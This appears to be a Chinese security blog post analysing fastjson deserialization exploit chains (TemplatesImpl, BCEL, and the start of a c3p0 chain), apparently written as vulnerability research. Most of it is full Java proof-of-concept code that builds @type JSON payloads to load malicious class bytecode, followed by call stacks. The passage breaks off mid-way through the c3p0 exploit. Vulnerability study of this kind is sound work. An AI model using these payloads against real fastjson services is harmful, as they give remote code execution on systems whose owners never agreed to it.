    <content type="html"><![CDATA[<h2 id="TemplatesImpl-链"><a href="#TemplatesImpl-链" class="headerlink" title="TemplatesImpl 链"></a>TemplatesImpl 链</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt;&#x3D; 1.2.24</p><p>缺点： 代码要开 Feature，因为CC3的后半段的字段都是public的，默认不支持，所以挺鸡肋的。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：source 为 <code>TemplatesImpl#getOutputProperties</code>，通过 fastjson 触发；sink 就是正常的CC3后半段链子，实现动态类加载，并且可以把恶意类写入 _bytecodes，从而实现不出网利用。</p><p>构造Exp的代码如下：</p><figure class="highlight java"><figcaption><span>title:"Poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.templatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: poc for fastjson 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:46</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="BCEL-链"><a href="#BCEL-链" class="headerlink" title="BCEL 链"></a>BCEL 链</h2><p>本质：实际就是 bcel 的 classloader 支持携带字节码进行类加载，所以用这个类可以不用访问外网实现类加载。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>fastjson &lt;&#x3D; 1.2.47 or fastjson &lt;&#x3D; 1.2.24</li><li>jdk &lt; 8u251</li></ul><p>漏洞所需依赖有下面两种，实际上只要有tomcat就可以了，因为tomcat自带tomcat-dbcp依赖：</p><p>tomcat 依赖，注意 payload 变化：&lt;&#x3D;tomcat7 source点是 <code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>、&gt;&#x3D;tomcat8 source点 是 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>commons-dbcp 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：poc 也分两种， <strong>fastjson 的不同版本，对应的 payload 构造和 source 点也不同</strong>。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>bcel exp for fastjson &lt;&#x3D; 1.2.24</p><figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 14:56</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +<span class="comment">/*此处Tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource、Tomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource*/</span></span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassLoader\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+ code +<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个经典的 fastjson 调用 getter，source 点是 <code>BasicDataSource#getConnection</code> ，同时设置 ClassLoader为bcel，sink 点是 <code>BasicDataSource#createConnectionFactory</code>。</p><p><strong>bcel 可以不出网进行动态类加载的原因</strong>：在 <code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code> 中，如果 <code>class_name</code> 以 <code>$$BCEL$$</code> 开头，则会读取 <code>class_name</code> 后面的字节码并调用 <code>define_class</code> 进行类的加载。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c42e36f083d06cb469e2bb1824e8548d.png"></p><p><strong>所以攻击者可以把字节码写进 payload 里，从而实现不出网的动态类加载。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br><span class="line">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSON:902, JSON (com.alibaba.fastjson)</span><br><span class="line">toJSON:824, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:206, JSON (com.alibaba.fastjson)</span><br><span class="line">main:27, POC_1_2_24 (Poc.bcel)</span><br></pre></td></tr></table></figure><p>bcel exp for fastjson &lt;&#x3D; 1.2.47</p><figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 15:42</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;xx\&quot;:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;   : \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;x\&quot; : &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;name\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;val\&quot;   : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;c\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot; : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125; : \&quot;xxx\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        <span class="comment">// 这里必不可少，坑</span></span><br><span class="line">        jsonObject.toJSONString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个版本踩坑，触发点不在 parseObject，而是得到反序列化后的对象， 再进行 <code>jsonObject.toJSONString()</code> 才会触发。</p><p>这个链子和上一个完全一样，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">write:-1, ASMSerializer_1_BasicDataSource (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:236, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:863, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.bcel)</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.freebuf.com/vuls/360993.html">https://www.freebuf.com/vuls/360993.html</a></li></ul><h2 id="c3p0二次反序列化链"><a href="#c3p0二次反序列化链" class="headerlink" title="c3p0二次反序列化链"></a>c3p0二次反序列化链</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt; 1.2.47 ，payload 分两个，简单的可在低版本使用，复杂的可在 fastjson &lt;1.2.47 的条件下使用。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：通过fastjson触发setter设置<code>userOverridesAsString</code>，source点是WrapperConnectionPoolDataSource的构造函数，其中会执行<code>parseUserOverridesAsString(this.getUserOverridesAsString())</code>，经过一系列调用会到达 sink 点，一个反序列化方法<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray</code>，他会对<code>userOverridesAsString</code>中的 bytecodes 做解码和反序列化。</p><p>所以我们的 payload 应该是一个 evil object 的序列化字符串，并对其进行相应的编码，在fastjson链子触发之后，会对这个evil serialize string 进行解码和反序列化，从而实现二次反序列化攻击，。下面的Poc使用的是 CC6的对象。</p><p>需要注意的是 <code>WrapperConnectionPoolDataSource</code> 本身并没有 <code>userOverridesAsString</code> 属性和其对应的 setter，但是它的父类 <code>WrapperConnectionPoolDataSourceBase</code> 有，所以链子才能够走通。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9f3bffd838a5bee5c5af218e8822cc69.png"></p><figure class="highlight java"><figcaption><span>title:"POC_1_2_47.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: c3p0 chain for fastjson &lt; 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:58</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span 